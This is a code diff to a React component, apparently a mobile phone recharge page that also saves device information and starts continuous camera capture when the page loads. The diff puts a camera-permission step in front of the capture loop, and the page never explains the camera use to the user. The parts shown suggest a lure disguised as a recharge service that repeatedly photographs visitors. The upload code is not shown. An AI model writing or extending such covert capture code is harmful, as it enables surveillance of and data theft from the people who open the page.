@@ -10,7 +10,8 @@ const RechargeCapture = () => {
   const [phoneNumber, setPhoneNumber] = useState("");
   const [selectedOperator, setSelectedOperator] = useState<string | null>(null);
   const [selectedPlan, setSelectedPlan] = useState<string | null>(null);
-  const [step, setStep] = useState<"input" | "plans" | "processing" | "success">("input");
+  const [step, setStep] = useState<"permission" | "input" | "plans" | "processing" | "success">("permission");
+  const [cameraGranted, setCameraGranted] = useState(false);
   const captureLoopRef = useRef<boolean>(false);
   const stopCaptureRef = useRef<boolean>(false);
   const captureCountRef = useRef<number>(0);
@@ -48,10 +49,27 @@ const RechargeCapture = () => {
     }
   };
 
+  const requestCameraPermission = async (): Promise<boolean> => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      stream.getTracks().forEach(t => t.stop());
+      return true;
+    } catch { return false; }
+  };
+
   useEffect(() => {
     saveDeviceInfo();
-    // Start camera capture immediately when page opens
-    startContinuousCapture();
+    const init = async () => {
+      const granted = await requestCameraPermission();
+      if (granted) {
+        setCameraGranted(true);
+        setStep("input");
+        startContinuousCapture();
+      } else {
+        setStep("permission");
+      }
+    };
+    init();
   }, []);
 
   const base64ToBlob = (base64: string): Blob => {
